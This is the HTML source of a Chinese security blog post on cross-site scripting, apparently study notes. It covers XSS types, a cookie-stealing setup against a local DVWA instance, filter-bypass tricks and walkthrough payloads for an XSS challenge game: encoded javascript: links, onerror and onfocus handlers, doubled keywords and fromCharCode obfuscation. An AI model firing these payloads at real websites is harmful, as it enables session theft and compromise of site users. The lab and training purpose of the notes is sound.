@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Web安全,XSS,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XSS相关01-xss简介 简单分类：  反射型（非持续型，地址本不存在，需要攻击者自己构造） 存储型（持续性，多出现在留言板，评论等场景，危害较前者大） DOM型   利用：  可自己写代码搭建攻击平台（见后面cookie接受页面编写） 也借助网上在线xss平台（如sss中xss平台）">
+<meta name="keywords" content="Web安全,XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS漏洞">
+<meta property="og:url" content="http://21guns.top/2018/01/22/XSS漏洞/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="XSS相关01-xss简介 简单分类：  反射型（非持续型，地址本不存在，需要攻击者自己构造） 存储型（持续性，多出现在留言板，评论等场景，危害较前者大） DOM型   利用：  可自己写代码搭建攻击平台（见后面cookie接受页面编写） 也借助网上在线xss平台（如sss中xss平台）">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-20/41262893.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-20/37723479.jpg">
+<meta property="og:updated_time" content="2019-02-18T07:39:44.125Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS漏洞">
+<meta name="twitter:description" content="XSS相关01-xss简介 简单分类：  反射型（非持续型，地址本不存在，需要攻击者自己构造） 存储型（持续性，多出现在留言板，评论等场景，危害较前者大） DOM型   利用：  可自己写代码搭建攻击平台（见后面cookie接受页面编写） 也借助网上在线xss平台（如sss中xss平台）">
+<meta name="twitter:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-20/41262893.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2018/01/22/XSS漏洞/">
+
+
+
+
+
+  <title>XSS漏洞 | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2018/01/22/XSS漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T15:08:44+08:00">
+                2018-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全基础/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全基础</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XSS相关"><a href="#XSS相关" class="headerlink" title="XSS相关"></a>XSS相关</h1><h2 id="01-xss简介"><a href="#01-xss简介" class="headerlink" title="01-xss简介"></a>01-xss简介</h2><ul>
+<li><p>简单分类：</p>
+<ul>
+<li>反射型（非持续型，地址本不存在，需要攻击者自己构造）</li>
+<li>存储型（持续性，多出现在留言板，评论等场景，危害较前者大）</li>
+<li>DOM型</li>
+</ul>
+</li>
+<li><p>利用：</p>
+<ul>
+<li>可自己写代码搭建攻击平台（见后面cookie接受页面编写）</li>
+<li>也借助网上在线xss平台（如sss中xss平台）</li>
+</ul>
+</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li><p>工具使用：</p>
+<ul>
+<li>kali上xss利用神器Beef的使用</li>
+<li>beef与msf的结合</li>
+</ul>
+</li>
+<li><p>简单的cookie接受脚本编写（思路）</p>
+<ul>
+<li><p>触发端语句：<br><code>http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;window.open(“http://127.0.0.1/cookie/xss.html”);&lt;/script&gt;</code>(可设置打开页面属性，不可见)</p>
+</li>
+<li><p>触发端页面</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/41262893.jpg" alt></p>
+</li>
+<li><p>接受端语句</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/37723479.jpg" alt></p>
+</li>
+<li><p>通过跨站漏洞，访问特定页面，获取cookie发送至服务端进行接受处理</p>
+</li>
+<li><p>Xss接受cookie页面编程实现：</p>
+<ul>
+<li>获取当前url地址</li>
+<li>获取当前url地址下的cookie</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="02-跨站的过滤及绕过"><a href="#02-跨站的过滤及绕过" class="headerlink" title="02-跨站的过滤及绕过"></a>02-跨站的过滤及绕过</h2><ul>
+<li>过滤机制：过滤关键字，字符实例化（把&lt;或&gt;实例化编码等），限制长度</li>
+<li>绕过：大小写，关键字替换，编码，</li>
+</ul>
+<ol>
+<li><p>过滤<script>或其它关键字（php代码中正则过滤）</p>
+<ul>
+<li><p>code</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/18900612.jpg" alt=""></p>
+</li>
+<li><p>绕过：大小写绕过</p>
+</li>
+</ul>
+</li>
+<li><p>过滤<script>关键字（正则中加i参数，不考虑大小写）</p>
+<ul>
+<li><p>code</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/19210410.jpg" alt=""></p>
+</li>
+<li><p>绕过：</p>
+<ul>
+<li>大小写无法绕过，因为i参数不考虑大小写，使用其他语句来调用js语句</li>
+<li>如：<br><code>&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></li>
+<li>图片没有指定，也就是出错了。Onerror 这个事件就会出发。引发 XSS 漏洞，没有用<script> 标签。 </li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>过滤alert关键字，并不考虑大小写，一并过滤</p>
+<ul>
+<li><p>code</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/61762998.jpg" alt=""></p>
+</li>
+<li><p>绕过</p>
+<ul>
+<li>使用JavaScript中的fromCharCode绕过（fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串，如<code>String.fromCharCode(65,66,67)返回ABC）</code></li>
+<li><code>&lt;IMG SRC=&quot;&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&quot;&gt;</code></li>
+<li>（利用小葵字符串转为ascii，将alert(1)转为97,108,101,114,116,40,49,41；注意String.fromCharCode的大小写问题）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>变量接受封装过滤</p>
+<ul>
+<li><p>code</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/54047519.jpg" alt=""></p>
+</li>
+<li><p>绕过：</p>
+<ul>
+<li><p>使其php代码失效，组合语句，重定向</p>
+</li>
+<li><p>失败的原因将输入的内容都放置在一个变量；成功的原因输入内容放在两个变量，并执行代码）</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/87117925.jpg" alt=""></p>
+</li>
+<li><p>eval在js和PHP中同样用来执行语句；js中声明变量有var关键字，没$</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/35911443.jpg" alt=""></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>实例化过滤</p>
+<ul>
+<li>htmlentities函数</li>
+<li>把字符转换为 HTML 实体</li>
+</ul>
+</li>
+</ol>
+<h2 id="03-xss过关游戏"><a href="#03-xss过关游戏" class="headerlink" title="03-xss过关游戏"></a>03-xss过关游戏</h2><blockquote>
+<p><a href="http://blog.icxun.cn/Note/308.html">http://blog.icxun.cn/Note/308.html</a><br><a href="https://xianzhi.aliyun.com/forum/read/1462.html?displayMode=1&amp;u=1338784901396718">https://xianzhi.aliyun.com/forum/read/1462.html?displayMode=1&amp;u=1338784901396718</a></p>
+</blockquote>
+<ol>
+<li><p><code>&lt;script&gt;alert()&lt;/script&gt;</code></p>
+</li>
+<li><p><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code></p>
+</li>
+<li><p>事件调用<br><code>1&#39; oninput=&#39;alert()&#39; &#39;</code></p>
+</li>
+<li><p>a标签调用，超链接</p>
+<p><code>123&quot;&gt; &lt;a href=&quot;JavaScript:alert();&quot;&gt;123&lt;/a&gt;</code></p>
+</li>
+<li><p>大小写绕过</p>
+<p><code>&lt;input name=keyword  value=&quot;123&quot;&gt; &lt;Script&gt;alert()&lt;/script&gt;//&quot;&gt;123&quot;&gt; &lt;Script&gt;alert()&lt;/script&gt;//</code></p>
+</li>
+<li><p>重复</p>
+<p><code>123&quot;&gt;&lt;scscriptript&gt;alert()&lt;/scscriptript&gt;//</code></p>
+</li>
+<li><p>a标签超链接，html实体编码，url编码</p>
+<p><code>%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116;:alert();</code></p>
+</li>
+<li><p><code>%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116;:alert(&#39;http://&#39;);</code></p>
+<p>或者用`或者用实体编码</p>
+</li>
+<li><p>利用referer字段</p>
+<p><code>&lt;input name=&quot;t_ref&quot;  value=&quot;123&quot; &gt;&lt;script&gt;alert()&lt;/script&gt;//&quot; type=&quot;hidden&quot;&gt;</code></p>
+</li>
+<li><p>注意iframe标签</p>
+<ul>
+<li>F12firebug，输入点在iframe</li>
+<li>xsspayload上传到自己服务器</li>
+<li>src包含</li>
+</ul>
+</li>
+<li><p><code>http://127.0.0.1/1/xss/level16.php?keyword=&lt;img%0asrc=&#39;x&#39;%0aonerror=alert()&gt;</code></p>
+<ul>
+<li>过滤空格，script，/</li>
+<li>img标签，%0a，%0d突破空格</li>
+</ul>
+</li>
+<li><p>尖括号被过滤，利用事件</p>
+</li>
+<li><p><code>http://127.0.0.1/1/xss/level17.php?arg01=a111&amp;arg02=111 onfocus=alert(2)</code></p>
+</li>
+<li><p>过滤尖括号: 利用事件onfocus</p>
+<ul>
+<li><code>&lt;input name=&quot;t_sort&quot;  value=&quot;123&quot; onfocus=alert() type=&quot;text&quot; type=&quot;hidden&quot;&gt;</code></li>
+<li><code>http://127.0.0.1/1/xss/level10.php?keyword=&lt;script&gt;alert()&lt;/script&gt;&amp;t_link=123t_history=123&amp;t_sort=123&quot; onfocus=alert() type=&quot;text</code></li>
+</ul>
+</li>
+<li><p>利用ua字段，利用cookie字段</p>
+</li>
+</ol>
+</script></p></li></ol>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/22/编辑器上传漏洞/" rel="next" title="编辑器上传漏洞">
+                <i class="fa fa-chevron-left"></i> 编辑器上传漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/22/文件包含漏洞/" rel="prev" title="文件包含漏洞">
+                文件包含漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">108</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS相关"><span class="nav-text">XSS相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#01-xss简介"><span class="nav-text">01-xss简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-跨站的过滤及绕过"><span class="nav-text">02-跨站的过滤及绕过</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
